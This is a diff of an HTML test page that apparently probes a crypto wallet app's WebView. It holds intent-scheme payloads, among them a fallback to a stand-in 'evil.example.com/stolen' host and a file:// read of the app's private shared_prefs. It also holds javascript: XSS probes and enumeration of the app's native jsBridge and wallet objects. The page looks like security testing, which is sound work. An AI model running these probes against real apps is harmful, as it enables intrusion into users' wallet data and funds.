@@ -1,24 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Test</title></head>
+<head><meta charset="UTF-8"><title>CoinEx WebView Test</title></head>
 <body>
-<h2>Intent Scheme Test</h2>
-<p>Test 1 - browser_fallback_url with javascript:</p>
-<a id="t1" href="intent://example.com#Intent;scheme=https;browser_fallback_url=javascript:alert(document.domain);end">Test 1: javascript: fallback</a>
+<h2>WebView Security Tests</h2>
+
+<p><b>Test 1 - XSS via location:</b></p>
+<button onclick="location.href='javascript:alert(document.domain)'">Test 1: javascript: via location</button>
+
 <br><br>
-<p>Test 2 - browser_fallback_url with external URL:</p>
-<a id="t2" href="intent://example.com#Intent;scheme=https;browser_fallback_url=https://evil.example.com/stolen;end">Test 2: open external URL</a>
+<p><b>Test 2 - Open external via window.open:</b></p>
+<button onclick="window.open('https://example.com')">Test 2: window.open</button>
+
 <br><br>
-<p>Test 3 - file:// scheme:</p>
-<a id="t3" href="intent://example.com#Intent;scheme=https;browser_fallback_url=file:///data/data/com.viabtc.wallet/shared_prefs/;end">Test 3: file:// access</a>
+<p><b>Test 3 - iframe with javascript:</b></p>
+<button onclick="var f=document.createElement('iframe');f.src='javascript:parent.document.write(document.domain)';document.body.appendChild(f)">Test 3: iframe javascript:</button>
+
 <br><br>
+<p><b>Test 4 - Check jsBridge exists:</b></p>
+<button onclick="alert(typeof window.jsBridge)">Test 4: jsBridge type</button>
+
+<br><br>
+<p><b>Test 5 - Check jsBridge methods:</b></p>
+<button onclick="try{alert(JSON.stringify(Object.keys(window.jsBridge)))}catch(e){alert(e.message)}">Test 5: jsBridge keys</button>
+
+<br><br>
+<p><b>Test 6 - evmAsk exists:</b></p>
+<button onclick="alert(typeof window.ethereum + ' / ' + typeof window.phantom)">Test 6: window.ethereum</button>
+
+<p id="out" style="color:red;word-break:break-all"></p>
 <script>
-document.getElementById("t1").addEventListener("click", function(e) {
-    e.preventDefault();
-    var iframe = document.createElement("iframe");
-    iframe.src = this.href;
-    document.body.appendChild(iframe);
-    setTimeout(function() { window.location = document.getElementById("t1").href; }, 100);
+window.addEventListener("message", function(e) {
+    document.getElementById("out").textContent += "MSG: " + JSON.stringify(e.data) + "
+";
 });
 </script>
 </body>
